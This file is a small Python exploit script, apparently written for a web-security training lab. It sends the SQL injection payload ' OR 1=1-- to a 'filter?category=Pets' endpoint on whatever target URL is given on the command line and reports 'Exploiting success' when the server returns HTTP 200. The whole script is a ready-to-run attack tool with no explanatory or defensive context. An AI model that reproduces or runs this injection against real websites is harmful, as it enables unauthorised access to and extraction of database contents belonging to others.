import requests
import argparse
from urllib.parse import urlparse
from urllib.parse import quote

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (eg: http://example.com)")
args = parser.parse_args()
input_url = args.url

endpoint = "filter?category=Pets"
payload = "' OR 1=1--"


def parse_endpoint(url, endpoint):
    url_input = urlparse(url)
    url_endpoint = f"{url_input.scheme}://{url_input.netloc}/{endpoint}"
    return url_endpoint


def exploit(url, endpoint, payload):
    endpoint = parse_endpoint(url, endpoint)
    exploit = f"{endpoint}{payload}"
    encoded_url = quote(exploit, safe=':/?=')

    try:
        response = requests.get(encoded_url)
        response.raise_for_status()
        return response.status_code
    except requests.exceptions.ConnectionError:
        print(f"Connection error occurred\nCheck again if the host is up!!!")
        return (None, None)
    except requests.exceptions.HTTPError as http_err:
        print(f'The host responses with: "{
              http_err}"\nCheck again if the host is up!!!')
        return (None, None)


def main():
    print("Exploiting target...")
    print("-"*50)
    response = exploit(input_url, endpoint, payload)
    if response == 200:
        print(f"Endpoint: {parse_endpoint(input_url, endpoint)}")
        print(f"Payload: {payload}")
        print("-"*50)
        print("Exploiting success!!!")
    else:
        print("-"*50)
        print("Fail to exploit the target!!!")


if __name__ == "__main__":
    main()
